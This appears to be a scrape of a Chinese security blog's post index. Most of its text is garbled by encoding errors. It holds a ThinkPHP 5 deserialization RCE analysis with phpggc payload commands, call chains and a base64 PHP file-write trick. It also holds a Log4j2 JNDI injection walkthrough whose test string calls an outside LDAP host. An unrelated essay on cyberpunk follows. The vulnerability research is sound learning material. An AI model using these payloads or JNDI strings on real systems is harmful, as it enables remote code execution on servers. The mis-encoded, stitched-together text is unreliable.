ç¬¬ä¸€æ¬¡è¿›å…¥çš„æ—¶å€™, payloadçš„å€¼(ä¹Ÿå°±æ˜¯\u0026lt;where\u0026gt;AAAxxxxxxé‚£ä¸ªä¸œè¥¿)æ˜¯è¢«èµ‹å€¼ç»™äº†setå‡½æ•°çš„nameå‚æ•°, ä½†æ˜¯ç¬¬äºŒæ¬¡è¿›å…¥çš„æ—¶å€™, nameå‚æ•°tagå€¼, valueå‚æ•°æ˜¯payload.\næœ€ååœ¨è¿™æ¬¡setå‡½æ•°ä¸­, æˆåŠŸå°†payloadæ‹¼æ¥åœ¨äº†exitåé¢, å¹¶ä½¿ç”¨php://filteræˆåŠŸç»•è¿‡, å½“ç„¶,é€šè¿‡getCacheKeyæ–¹æ³•å¾—åˆ°çš„æ–‡ä»¶ååªä¸è¿‡æ˜¯å¯¹tagå€¼çš„ä¸€æ¬¡md5è€Œå·².\nåˆ°æ­¤ä¸ºæ­¢,æˆåŠŸå†™å…¥æ–‡ä»¶, éœ€è¦æ³¨æ„çš„æ˜¯phpggcç”Ÿæˆçš„è¿™ä¸ªpayloadå†™å…¥çš„æ–‡ä»¶æ–‡ä»¶åæ˜¯å›ºå®šçš„3b58a9545013e88c7186db11bb158c44.php, ç†ç”±å‰é¢è¯´è¿‡, å°±æ˜¯è¯¥æ–‡ä»¶åçš„ç”Ÿæˆå°±nullå€¼çš„md5å†æ‹¼æ¥ä¸Šå­—ç¬¦ä¸²tag_ç„¶åå†è¿›è¡Œmd5.\næ•´ä½“æ€è·¯å¦‚ä¸‹, æ„Ÿè§‰æœ€å…³é”®çš„è¿˜æ˜¯åœ¨setTagItemé‚£ä¸€æ­¥, é‚£ä¸€æ­¥å°†åŸæœ¬æ˜¯keyçš„payloadå˜æˆäº†valueå‚æ•°, å¹¶ä½¿å…¶åœ¨åé¢æˆåŠŸè¢«å†™å…¥æ–‡ä»¶.\nthink\\Process#__destruct --\u0026gt; think\\Process#stop --\u0026gt; think\\model\\relation\\HasMany#close --\u0026gt; think\\model\\relation\\HasMany#__call --\u0026gt; think\\model\\relation\\HasMany#baseQuery --\u0026gt; think\\console\\Output#where --\u0026gt; think\\console\\Output#__call --\u0026gt; call_user_func_array --\u0026gt; think\\console\\Output#block --\u0026gt; writeln --\u0026gt; write --\u0026gt; think\\session\\driver\\Memcache#write --\u0026gt; think\\cache\\driver\\Memcached#set (1) --\u0026gt; think\\cache\\driver\\Memcached#has --\u0026gt; think\\cache\\driver\\File#get --\u0026gt; getCacheKey --\u0026gt; å°†php://filterä¼ªåè®®æ‹¼æ¥åˆ°å¼€å¤´,è¿”å›php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php ,æ³¨æ„è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯ç›®æ ‡æ–‡ä»¶ --\u0026gt; think\\cache\\driver\\Memcached#getCacheKey è¿”å›\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt; --\u0026gt; think\\cache\\driver\\File#set --\u0026gt; getCacheKeyè·å–æ–‡ä»¶å,å¯¹\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt;è¿›è¡Œmd5ä¹‹åè¿›è¡Œæ‹¼æ¥æˆä¸ºphp://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php,åŒæ—¶è¿™é‡Œå¯ä»¥è¿›è¡Œä¸€ä¸ªmkdir,ç„¶è€Œè¿™é‡Œçš„ç›®å½•åæ˜¯éæ³•çš„,ç„¶åè¿”å›æ–‡ä»¶å --\u0026gt; å›åˆ°setæ–¹æ³•,$dataå‰é¢æ‹¼æ¥ä¸Šäº†æ­»äº¡exit,è¿›è¡Œfile_put_contents,ç”Ÿæˆæ–‡ä»¶ 6a644d26b09257b882dae6e407f23d42.php,å†…å®¹ä¸ºä¹±ç  --\u0026gt; å›åˆ°(1) å‡½æ•° --\u0026gt; think\\cache\\driver\\Memcached#setTagItem ç”Ÿæˆå¯æ§çš„tagå--\u0026gt; å†æ¬¡è¿›å…¥think\\cache\\driver\\Memcached#set , ä¸¤ä¸ªå‚æ•°éƒ½å¯æ§ --\u0026gt; think\\cache\\driver\\File#set å‚æ•°æ˜¯å‰é¢çš„ä¸¤ä¸ªå‚æ•° --\u0026gt; getCacheKey å°†tagåè¿›è¡Œmd5ä¹‹åè¿›è¡Œæ‹¼æ¥å¾—åˆ° php://filter/convert.base64-decode/resource=/srv/http/tp5/3b58a9545013e88c7186db11bb158c44.php --\u0026gt; å›åˆ°\\think\\cache\\driver\\File#set å¯¹ä¹‹å‰å¯æ§å‚æ•°ä¹‹ä¸€dataè¿›è¡Œæ­»äº¡exitæ‹¼æ¥,å¹¶è¿›è¡Œfile_put_contents,æ•ˆæœå°±æ˜¯file_put_contents(\u0026#39;php://filter/convert.base64-decode/resource=/srv/http/tp5/3b58a9545013e88c7186db11bb158c44.php\u0026#39;, \u0026#39;\u0026lt;?php\\n//000000000000\\nexit();?\u0026gt;\\ns:46:\u0026#34;\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt;\u0026#34;;\u0026#39;) --\u0026gt; æ–‡ä»¶å†™å…¥æˆåŠŸ,å†…å®¹ä¸ºä¹±ç +phpä»£ç  5.0.24 RCE ç¯å¢ƒæ­å»º åŒä¸Š\næ¼æ´åˆ†æ é¦–å…ˆç”Ÿæˆpayload\n./phpggc ThinkPHP/RCE2 system \u0026#34;touch /tmp/helloman\u0026#34; | base64 -w 0 å¼€å§‹è°ƒè¯•å‰, è¯·ç¡®è®¤ä½ çš„phpç¯å¢ƒçš„ç‰ˆæœ¬, å¦‚æœç‰ˆæœ¬æ˜¯php7.x, è¯·æ‰“å¼€æ–‡ä»¶thinkphp/library/think/db/Query.php çœ‹ç¬¬400è¡Œä»£ç , è¿™é‡Œä½¿ç”¨æˆ‘çš„å¸¦æœ‰è­¦å‘Šæç¤ºçš„vimçœ‹:\nè¿™ç§å†™æ³•åœ¨php7.xä¸­å·²ç»è¢«å¼ƒç”¨, å…·ä½“æ˜¯å“ªä¸€ä¸ªå­ç‰ˆæœ¬æˆ‘æ²¡æœ‰æ·±ç©¶. æ€»ä¹‹, å¦‚æœå‘ç°payloadä¸èƒ½æ‰§è¡Œ, è¯·åˆ‡æ¢è‡ªå·±çš„phpç‰ˆæœ¬, æˆ–è€…åƒæˆ‘ä¸€æ ·å°†è¿™ä¸€è¡Œåˆ æ‰æ”¹æˆä¸Šå›¾ç¬¬400è¡Œ.\nPS: è¿™é‡Œè¦åæ§½ä¸€ä¸‹Arch Linux Auré‡Œé¢çš„php56-xdebugåŒ…\u0026hellip;17å¹´å¼€å§‹å°±ä¸æ›´æ–°äº†, 21å¹´éƒ½æœ‰ç”¨æˆ·åœ¨è¯„è®ºè¯´å¾—ä¿®æ”¹æ„å»ºæ–‡ä»¶æ‰å¯ä»¥å®‰è£….\nå¥½äº†, ä¸‹é¢å¼€å§‹è°ƒè¯•.\nç¬¬ä¸€éƒ¨åˆ†, å’Œè¿‡å¾€thinkphp5.0.24å†™æ–‡ä»¶ååºåˆ—åŒ–é“¾çš„å‰åŠéƒ¨åˆ†ä¸€æ ·,å…·ä½“å¯ä»¥å‚è€ƒhttps://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/#more , è¿™é‡Œå°±ç®€å•è¯´æ˜.\né¦–å…ˆè¿›å…¥think\\process\\pipes\\Windows#__destructçš„think\\process\\pipes\\Windows#removeFiles, å…¶ä¸­çš„file_existså‡½æ•°ä¼šè§¦å‘think\\model\\Pivot#__toString, ç„¶åthink\\model\\Pivotä¼šè§¦å‘å†…éƒ¨çš„toJson ç„¶åè§¦å‘toArray, åœ¨è¿™ä¸ªå‡½æ•°ä¸­, æ§åˆ¶ä»£ç æ‰§è¡Œåˆ°912è¡Œçš„$value-\u0026gt;getAttr($attr), $valueæ˜¯think\\console\\Outputå¯¹è±¡, è¿™ä¼šè§¦å‘think\\console\\Output#__call\næ¥ä¸‹æ¥è§¦å‘think\\console\\Outputçš„block writeln write ä¸‰ä¸ªæ–¹æ³•\nhandleæ˜¯think\\session\\driver\\Memcachedå¯¹è±¡\nhandleræ˜¯think\\cache\\driver\\Memcacheå¯¹è±¡, å®ƒçš„set æ–¹æ³•ä¼šè°ƒç”¨å®ƒçš„hasæ–¹æ³•\nè¿™é‡Œ, handleræ˜¯think\\Requestå¯¹è±¡, rceæœ€ç»ˆå°†ä¼šåœ¨è¿™ä¸ªå¯¹è±¡ä¸­è§¦å‘, è·Ÿè¿›å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†inputæ–¹æ³•\nåœ¨inputæ–¹æ³•ä¸­, inputæ–¹æ³•çš„å‚æ•°å¦‚ä¸‹\npublic function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) è¾“å…¥çš„å‚æ•°å¦‚ä¸‹\nç»è¿‡äº†ä¸€ç³»åˆ—å¯¹æ•°ç»„çš„å¤„ç†å , ä»£ç è¿›å…¥$filter = $this-\u0026gt;getFilter($filter, $default);\nåœ¨è¿™é‡Œ, \u0026ldquo;system\u0026rdquo; å­—ç¬¦ä¸²ä¼šè¢«èµ‹äºˆç»™filterå¹¶è½¬æ¢ä¸ºæ•°ç»„åè¿”å›\næ¥ä¸‹æ¥ä»£ç æ‰§è¡Œåˆ°$this-\u0026gt;filterValue($data, $name, $filter);è¾“å…¥å¦‚ä¸‹\nåˆ°è¿™é‡Œä»£ç æ‰§è¡Œå®Œæˆ.\nå®Œæ•´è°ƒç”¨é“¾æ¡\nthink\\process\\pipes\\Windows#__destruct --\u0026gt; think\\process\\pipes\\Windows#removeFiles --\u0026gt; file_exists --\u0026gt; think\\model\\Pivot#__toString --\u0026gt; think\\model\\Pivot#toJson --\u0026gt; think\\model\\Pivot#toArray --\u0026gt; $value-\u0026gt;getAttr($attr) --\u0026gt; think\\console\\Output#__call --\u0026gt; think\\console\\Output#block --\u0026gt; think\\console\\Output#writeln --\u0026gt; think\\console\\Output#write --\u0026gt; $this-\u0026gt;handle-\u0026gt;write --\u0026gt; think\\session\\driver\\Memcached#write --\u0026gt; $this-\u0026gt;handler-\u0026gt;set --\u0026gt; think\\cache\\driver\\Memcache#set --\u0026gt; think\\cache\\driver\\Memcache#has --\u0026gt; $this-\u0026gt;handler-\u0026gt;get --\u0026gt; think\\Request#get --\u0026gt; think\\Request#input --\u0026gt; think\\Request#filterValue --\u0026gt; call_user_fund($filter, $value) ps: è¯¥é“¾å­çš„å‰åŠéƒ¨åˆ†å¯ä»¥ä½¿ç”¨FW1é“¾å­çš„å‰åŠéƒ¨åˆ† ,ä¹Ÿå°±æ˜¯\nthink\\Process#__destruct --\u0026gt; think\\Process#stop --\u0026gt; think\\model\\relation\\HasMany#close --\u0026gt; think\\model\\relation\\HasMany#__call --\u0026gt; think\\model\\relation\\HasMany#baseQuery --\u0026gt; think\\console\\Output#where --\u0026gt; think\\console\\Output#__call 5.1.x-5.2.x RCE ç¯å¢ƒæ­å»º ./phpggc ThinkPHP/RCE1 system id | base64 -w 0 composer create-project topthink/think=5.1.41 thinkphp5141 --prefer-dist å’Œä¹‹å‰ä¸€æ ·,å†™å…¥ä¸€ä¸ªååºåˆ—åŒ–å…¥å£.\næ¼æ´åˆ†æ é¦–å…ˆ,ååºåˆ—åŒ–è¿›å…¥think\\process\\pipes\\Windows#__destruct, è¿›å…¥removeFilesæ–¹æ³•\nfilename æ˜¯ think\\model\\Pivot å¯¹è±¡, file_existsæ–¹æ³•è§¦å‘__toStringæ–¹æ³•, ç»è¿‡toJson æ–¹æ³•åè§¦å‘toArrayæ–¹æ³•, éƒ¨åˆ†ä»£ç å¦‚ä¸‹\nthink\\model\\Pivot-\u0026gt;dataä»çˆ¶ç±»think\\modelä¸­è·å–, relationä¸ºç©º, å¾—åˆ°ç»“æœä¸º{smi1e =\u0026gt; \u0026quot;id\u0026quot;}\næ¥ç€è§¦å‘$this-\u0026gt;getAttr($key), keyæ˜¯smi1e.\né¦–å…ˆé€šè¿‡getDataå‡½æ•°,è·å–åˆ°å­—ç¬¦ä¸²id, ç„¶åé€šè¿‡$this-\u0026gt;withAttr[$fieldName] è·å–åˆ°systemå­—ç¬¦ä¸², ä¸­é—´èƒ½è·³è¿‡çš„ifåˆ¤æ–­éƒ½è·³è¿‡\næœ€ååœ¨ç¬¬493è¿›è¡ŒåŠ¨æ€æ‰§è¡Œ, è¿™é‡Œä¼ å…¥çš„å‚æ•°æœ‰ä¸¤ä¸ª,ç¬¬ä¸€ä¸ªå°±æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤, ç¬¬äºŒä¸ªæ ¹æ®phpæ‰‹å†Œ, åº”è¯¥æ˜¯intç±»å‹çš„å¼•ç”¨å˜é‡, è´Ÿè´£è®°å½•å‘½ä»¤æ‰§è¡Œ çš„ç»“æœ, ä½†æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°ç»„å´è¿˜æ˜¯å¯ä»¥æ‰§è¡Œå‘¢? æˆ‘ä¹Ÿä¸çŸ¥é“, ä¸è¿‡ç¡®å®æ˜¯å¯ä»¥çš„, å¯ä»¥æ‰§è¡Œä»¥ä¸‹ä»£ç æ¥éªŒè¯\n\u0026lt;?php $a = [\u0026#34;smile\u0026#34;=\u0026gt;\u0026#34;id\u0026#34;]; system(\u0026#34;touch flag\u0026#34;,$a); think\\process\\pipes\\Windows#__destruct --\u0026gt; think\\process\\pipes\\Windows#removeFiles --\u0026gt; file_exists --\u0026gt; think\\model\\Pivot#__toString --\u0026gt; think\\model\\Pivot#toJson --\u0026gt; think\\model\\Pivot#toArray --\u0026gt; think\\model\\Pivot#getAttr --\u0026gt; think\\model\\Pivot#getData è·å–å‘½ä»¤å­—ç¬¦ä¸² --\u0026gt; é€šè¿‡å¯æ§æ•°ç»„ç´¢å¼•è·å–systemå­—ç¬¦ä¸², b ","permalink":"https://dragonbox.top/posts/sec-phpggc-thinkphp/","summary":"\u003cblockquote\u003e\n\u003cp\u003ephpggcä¸­å…³äºthinkphpçš„æ”»å‡»æ€è·¯å­¦ä¹ \u003c/p\u003e\n\u003c/blockquote\u003e","title":"thinkphp5æ¼æ´å­¦ä¹ "},{"content":" æ˜å¤©å®‰å…¨åœˆæ ¡æ‹›é¢è¯•: é¢è¯•å®˜: è¯·è¯´è¯´ä½ ä¼šä»€ä¹ˆæŠ€èƒ½? æˆ‘: ${jndi:ldap://xxx.dnslog.cn/exp} é¢è¯•å®˜: è¯·è¯´è¯´ä½ æœ€è¿‘å…³æ³¨è¿‡çš„æ¼æ´? æˆ‘: ${jndi:ldap://xxx.dnslog.cn/exp} é¢è¯•å®˜: ä½ å¹³æ—¶æœ‰åŠ¨æ‰‹è°ƒè¯•è¿‡å—? æˆ‘: ${jndi:ldap://xxx.dnslog.cn/exp} æˆ‘ï¼šè¿™dnslogæ˜¯ä¸æ˜¯å¡äº† è¿™é¢è¯•å®˜æ€ä¹ˆè¿˜æ²¡rce\nç¯å¢ƒæ­å»º æ–°å»ºmavené¡¹ç›®, pom.xmlå†™å…¥\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; åœ¨å®˜ç½‘ https://archive.apache.org/dist/logging/log4j/ ä¸‹è½½log4jç„¶ååœ¨project structureä¸­å¯¼å…¥ ä¸‹è½½ä½ç‰ˆæœ¬java8 https://repo.huaweicloud.com/java/jdk/ æˆ‘ä¸‹è½½çš„æ˜¯8u181,å°†å…¶ä½œä¸ºjavaè¿è¡Œç¯å¢ƒ å†™æµ‹è¯•ä»£ç \nimport org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Main { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args){ logger.error(\u0026#34;${jndi:ldap://39.105.176.37:1389/smzifq}\u0026#34;); } } æ¼æ´è°ƒè¯• è°ƒè¯•è¿›å…¥ è°ƒè¯•åˆ° ç„¶åè°ƒè¯•åˆ°MessagePatternConverter#formatæ–¹æ³•, çœ‹åˆ°è¿™é‡Œä¼šè¯•å›¾åŒ¹é…${å­—ç¬¦.å¹¶å°†payloadå­—ç¬¦ä¸²è§£æåˆ°å˜é‡valueä¸­å».\næ­¥è¿›replaceå‡½æ•°, å†æ­¥è¿›substituteå‡½æ•° è¿›å…¥ä¸‹ä¸€ä¸ªsubstituteä¸­ä¼šçœ‹åˆ°å®ƒä¼šåŒ¹é…ç»“å°¾çš„} å†å¾€ä¸‹å°±å¯ä»¥çœ‹åˆ°resolveVariableæ–¹æ³•è¢«è°ƒç”¨, é‡Œé¢è°ƒç”¨äº†lookupæ–¹æ³• åœ¨lookupæ–¹æ³•ä¸­,ä¼šè¯•å›¾å¯»æ‰¾:,å¹¶å°†:å‰é¢çš„éƒ¨åˆ†ä½œä¸ºprefix, éšåæ ¹æ®prefixæ¥å¯»æ‰¾ç±»\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè§„å®šäº†ä¸åŒçš„prefixå¯¹åº”çš„ç±»\nä½¿ç”¨çš„Jndi,æ‰€ä»¥ä½¿ç”¨çš„æ˜¯JndiLookupç±»,è°ƒç”¨äº†JndiLookup#lookupæ–¹æ³•,å¹¶å°†:åé¢çš„éƒ¨åˆ†ä½œä¸ºå‚æ•°ä¼ å…¥.\næœ€åè°ƒç”¨åˆ°äº†javax.naming.InitialContext#lookupæ–¹æ³•,serverç«¯æ”¶åˆ°è¯·æ±‚ æ¼æ´åˆ©ç”¨ æ™®é€šçš„jndiæ³¨å…¥å°±å¯ä»¥äº†\nå‚è€ƒ https://www.anquanke.com/post/id/262668#h3-5\n","permalink":"https://dragonbox.top/posts/sec-log4j2-jndi/","summary":"\u003cblockquote\u003e\n\u003cp\u003eæ˜å¤©å®‰å…¨åœˆæ ¡æ‹›é¢è¯•:\né¢è¯•å®˜: è¯·è¯´è¯´ä½ ä¼šä»€ä¹ˆæŠ€èƒ½?\næˆ‘: ${jndi:ldap://xxx.dnslog.cn/exp}\né¢è¯•å®˜: è¯·è¯´è¯´ä½ æœ€è¿‘å…³æ³¨è¿‡çš„æ¼æ´?\næˆ‘: ${jndi:ldap://xxx.dnslog.cn/exp}\né¢è¯•å®˜: ä½ å¹³æ—¶æœ‰åŠ¨æ‰‹è°ƒè¯•è¿‡å—?\næˆ‘: ${jndi:ldap://xxx.dnslog.cn/exp}\næˆ‘ï¼šè¿™dnslogæ˜¯ä¸æ˜¯å¡äº† è¿™é¢è¯•å®˜æ€ä¹ˆè¿˜æ²¡rce\u003c/p\u003e\n\u003c/blockquote\u003e","title":"log4j2 jndi æ¼æ´å­¦ä¹ å’Œè°ƒè¯•"},{"content":"ç§‘æŠ€çš„å‘å±•å¹¶ä¸ä»£è¡¨å†…å·çš„é¿å…,ç›¸å,ä¸€å‘³è¿½æ±‚åœ¨è™šæ‹Ÿä¸–ç•Œä¸­å¼€ç–†æ‹“åœŸ,å¿½è§†å®‡å®™å’Œæ·±æµ·çš„æ¢ç´¢å¼€å‘æ­£æ˜¯äººç±»ç¤¾ä¼šå†…å·åŒ–çš„é›†ä¸­åæ˜ ,æ­¤å¤„çš„å†…å·,å’Œé€šå¸¸çš„å†…å·å®šä¹‰ç›¸åŒ,å³\u0026quot;ä¸€ç±»æ–‡åŒ–æ¨¡å¼è¾¾åˆ°äº†æŸç§æœ€ç»ˆçš„å½¢æ€ä»¥å,æ—¢æ²¡æœ‰åŠæ³•ç¨³å®šä¸‹æ¥,ä¹Ÿæ²¡æœ‰åŠæ³•è½¬å˜ä¸ºæ–°çš„å½¢æ€.è€Œåªèƒ½ä¸æ–­åœ°åœ¨å†…éƒ¨å˜å¾—æ›´åŠ å¤æ‚çš„ç°è±¡\u0026quot;,åªä¸è¿‡å¯¹è±¡ä»æ™®é€šçš„å°ç¾¤ä½“å˜æˆäº†å…¨ä½“äººç±»,ç¤¾ä¼šçŸ›ç›¾çš„é¢‘ç¹çˆ†å‘è®©äººç±»å€¾å‘äºå°†è‡ªå·±çš„çµä¸è‚‰å¥‰çŒ®ç»™è™šæ‹Ÿçš„ç¥,è¿™ç§å¥‰çŒ®çš„çƒ­è¯šèƒŒåå……æ–¥ç€å¯¹å†°å†·ç°å®çš„æ— åŠ›æ„Ÿå’Œé€ƒé¿,å³ä¾¿è¿™ç§è™šæ‹Ÿæ˜¯äººç±»è‡ªå·±åˆ›é€ å‡ºæ¥çš„,ä»–ä»¬ä¾æ—§é€‰æ‹©å¿½è§†ç”šè‡³å¿˜å´è¿™ç§è‡ªçŸ¥,é€‰æ‹©è¢«å¥´å½¹,è†œæ‹œå’Œç»ä»°.\nå¦å¤–ä¸€æ–¹é¢,æ­£å¦‚æ´›å¤«å…‹æ‹‰å¤«ç‰¹æ‰€è¯´çš„\u0026quot;äººç±»æœ€å¤è€åˆæœ€å¼ºçƒˆçš„æƒ…ç»ª,å°±æ˜¯ææƒ§;è€Œæœ€å¤è€åˆæœ€å¼ºçƒˆçš„ææƒ§,æ˜¯å¯¹æœªçŸ¥çš„ææƒ§\u0026quot;,åœ¨åˆ»å½•åœ¨åŸºå› ä¸­çš„äººæ€§çš„é©±ä½¿ä¸‹,äººç±»åœ¨æ€»ä½“å±‚é¢ä¸Šå¯¹æœªçŸ¥çš„æ·±æµ·å’Œå¤ªç©ºæ˜¯ææƒ§çš„,å¯æ˜¯,è¦è®©äººç±»æ¥å—è‡ªå·±ç¤¾ä¼šå‘å±•åœæ»ä¸å‰çš„äº‹å®,åˆæ˜¯å¯è€»ä¸”æ— æ³•æ¥å—çš„.åœ¨è¿™ç§èƒŒæ™¯ä¸‹,è™šæ‹Ÿä¸–ç•Œçš„æ‰©å¼ ä»å¦ä¸€ä¸ªè§’åº¦ä¸ºå…¨ä½“äººç±»æä¾›äº†ä¸€ä¸ª\u0026quot;å‘å±•\u0026quot;çš„å¹»è±¡,ä½¿å¾—äººç±»å¯ä»¥å°†è’™è”½åŒçœ¼,é€ƒè„±ç”Ÿå­˜å›°å¢ƒ,å°†æ³¨æ„åŠ›é›†ä¸­åœ¨å·²æœ‰äº‹ç‰©çš„\u0026quot;å‘å±•\u0026quot;ä¸Š,å³ä¾¿æ˜¯å†…å·å¼çš„å‘å±•.\nä»ç†æ€§çš„è§’åº¦æ¥è¯´,äººç±»æ–‡æ˜è¦æƒ³é•¿å­˜ä¸ä¼‘,å¿…é¡»è¦å°†è§¦è§’æåŠ›æ‰©å¼ åˆ°å¤ªç©ºå’Œæµ·æ´‹å½“ä¸­,ç„¶è€Œäººç±»æ€»ä½“ä¸Šå‘ˆç°çš„æ˜¯ä¸€ç§éç†æ€§çš„æ„è¯†å½¢æ€,è¿™å¹¶ä¸æ–°å¥‡,åœ¨ä¸Šå¸å·²æ­»çš„å¹´ä»£é‡Œ,äººç±»ç›¸ä¿¡çš„ä¸å†æ˜¯ç¥æ˜è€Œæ˜¯ç§‘æŠ€å’Œèµ„æœ¬,è€Œç§‘æŠ€ä¸ºèµ„æœ¬æ‰€æŒæ§,æ‰€ä»¥èµ„æœ¬çš„ä¿¡ä»°ä¾¿æ˜¯äººç±»çš„ä¿¡ä»°,ä¹çœ‹ä¹‹ä¸‹,èµ„æœ¬ä»£è¡¨ç€è´ªå©ªå’Œé€åˆ©,å¹¶ä¸”å…·å¤‡ä¸€å®šç¨‹åº¦ä¸Šçš„ç†æ€§,ä½†å¯æƒœçš„æ˜¯,æ­£æ˜¯è¿™ç§ä¿¡ä»°å°†è™šæ‹Ÿä¸–ç•Œæ§ä¸Šç¥å›å¹¶åŠ å‰§äº†ç¤¾ä¼šçš„å†…å·åŒ–,è€Œè¿™ç§æƒ…å†µå¾ˆéš¾å‘ç”Ÿæ”¹å˜,ç†ç”±å¦‚ä¸‹:\nèµ„æœ¬å¹¶ä¸å…·å¤‡å¼•é¢†äººç±»ç¤¾ä¼šå‘å¥½å‘å±•çš„åŠ¨æœº,èµ„æœ¬è¡ŒåŠ¨çš„å”¯ä¸€åŠ¨æœºæ˜¯ä¸ºè‡ªèº«é€åˆ©\nèµ„æœ¬ç†æ€§çš„ä¸»ä½“åœ¨\u0026quot;è‡ªå·±çš„å¯¿å‘½æ˜¯æœ‰é™çš„\u0026quot;è¿™æ ·ä¸€ä¸ªå‰æä¸‹,ä¼šè‡ªå‘é€‰æ‹©åœ¨\u0026quot;å½“ä¸‹\u0026quot;æ—¶é—´ç‚¹è·åˆ©æœ€å¤§çš„å‘å±•æ–¹å‘\nå½“èµ„æœ¬åœ¨ä¸€ä¸ªé¢†åŸŸä¸­èƒ½æˆ–å³å°†è·å–è¶³å¤Ÿå¤šåˆ©æ¶¦,æˆ–è€…å‘ç°åˆ‡æ¢åˆ«çš„é¢†åŸŸæ‰€ä»˜å‡ºçš„ä»£ä»·è¿œå¤§äºè‡ªå·±æ‰€å¤±å»çš„æ—¶å€™,å®ƒå°†è°ƒç”¨èˆ†è®ºå¸å¼•äººç±»çš„æ³¨æ„åŠ›ä»¥æœŸæ›´å¤§çš„åˆ©æ¶¦ç©ºé—´\näººç±»æ˜¯ç›²ä»ä¸”æ„šæ˜§çš„,å°¤å…¶æ˜¯åœ¨è¢«æ¶ˆè´¹ç¤¾ä¼šé˜‰å‰²æ‰¹åˆ¤èƒ½åŠ›ååŸºæœ¬ä¸Šå·²ç»ä¸§å¤±äº†çœŸæ­£çš„è‡ªç”±æ„å¿—,æˆä¸ºèµ„æœ¬çš„ç‰µçº¿æœ¨å¶.\nä¸€ä¸ªé¢å¤–çš„å‘ç°æ˜¯,å¦‚æœå°†ä¸Šè¿°ä¸‰ä¸ªç†ç”±ä½œä¸ºè¯„åˆ¤èµ„æœ¬èƒ½åŠ›çš„æ ‡å‡†,å°±ä¼šå‘ç°è…¾è®¯é˜¿é‡Œå·´å·´ç­‰ä¸é ç§‘æŠ€é©±åŠ¨çš„å…¬å¸æ‰æ˜¯èµ„æœ¬æ„ä¹‰ä¸Šèƒ½åŠ›æœ€å¼ºçš„å…¬å¸,æˆ‘æ‹…å¿ƒè¿™ç§å†…å·å¼çš„å´›èµ·ä¼šæé†’å…¶ä»–èµ„æœ¬,æœ€å¤§åŒ–çš„åˆ©æ¶¦å®Œå…¨ä¸éœ€è¦ç§‘æŠ€åˆ›æ–°,åªéœ€è¦é \u0026quot;å†…å·\u0026quot;å°±å¯ä»¥äº†.æˆ–è®¸,ä»–ä»¬å·²ç»æ„è¯†åˆ°äº†?\nå…¶å®å¾ˆä¹…ä»¥å‰å°±æœ‰äººé¢„æµ‹åˆ°äº†å¦‚ä»Šçš„ç°çŠ¶,é‚£å°±æ˜¯èµ›ä¼¯æœ‹å…‹,å®ƒæƒ³å‘Šè¯‰äººä»¬,ç§‘æŠ€çš„ç•¸å½¢å‘å±•ä¸èƒ½è§£å†³è€Œä¼šåŠ å‰§ç¤¾ä¼šçŸ›ç›¾å’Œäººç±»çš„ç„¦è™‘,å¯é—æ†¾çš„æ˜¯,åœ¨èµ„æœ¬çš„æ“çºµä¸‹,è¿™ç§ç•¸å½¢çš„ç§‘æŠ€è¢«ç¹å¤ç‚«ç›®çš„å…‰å½±åŒ…è£…æˆäº†ä¸€ç§ç¾å­¦è±¡å¾,è¿™ç§äººç±»çš„ç„¦è™‘è¢«åˆ»æ„æ·¡åŒ–ç”šè‡³æŠ¹å»,è½¬è€Œé‡æ–°å˜æˆä¸€ç§å•†å“,ä¸€ç§æ— è®ºæ˜¯åœ¨å•†ä¸šæ„ä¹‰è¿˜æ˜¯ç²¾ç¥æ„ä¹‰ä¸Šå¯¹èµ„æœ¬åŠ›é‡æ›´åŠ æœ‰åˆ©çš„å•†å“\u0026ndash;æ—¢è°‹å–äº†åˆ©æ¶¦,åˆæ‰­æ›²äº†å¯¹æŠ—è™šæ‹Ÿçš„æ–‡å­¦,è¿™å‡º\u0026quot;åŒ–æ•Œä¸ºå‹\u0026quot;å®åœ¨é«˜æ˜è‡³æ.\nèµ›åšæœ‹å…‹æŒ‡å‡ºäº†ç§‘æŠ€ç•¸å½¢å‘å±•æ‰€äº§ç”Ÿçš„é—®é¢˜,è­¦å‘Šäººä»¬è¿™æ ·åšçš„åæœ,ä½†æ˜¯å¾ˆå¯æƒœ,æˆ‘ä»¬å·²ç»åœä¸ä¸‹æ¥äº†,çœ‹èµ·æ¥,æˆ‘ä»¬åŠ¿å¿…è¿ˆå…¥èµ›ä¼¯æœ‹å…‹å¼çš„æœªæ¥ç¤¾ä¼šä¸­,æ­¥å±¥åšå®š,çƒ­åˆ‡çœŸè¯š.è€Œåˆ°äº†é‚£ä¸ªæ—¶å€™,æˆ–è€…åœ¨é‚£ä¹‹å‰,ä¹Ÿè®¸æ›´æœ‰ä»·å€¼çš„é—®é¢˜æ˜¯:æˆ‘ä»¬å¦‚ä½•èµ°å‡ºèµ›ä¼¯æœ‹å…‹?\nè¯è¯´å›æ¥,åœ¨èµ›åšæœ‹å…‹è¢«æå‡ºçš„é‚£ä¸ªå¹´ä»£,æ 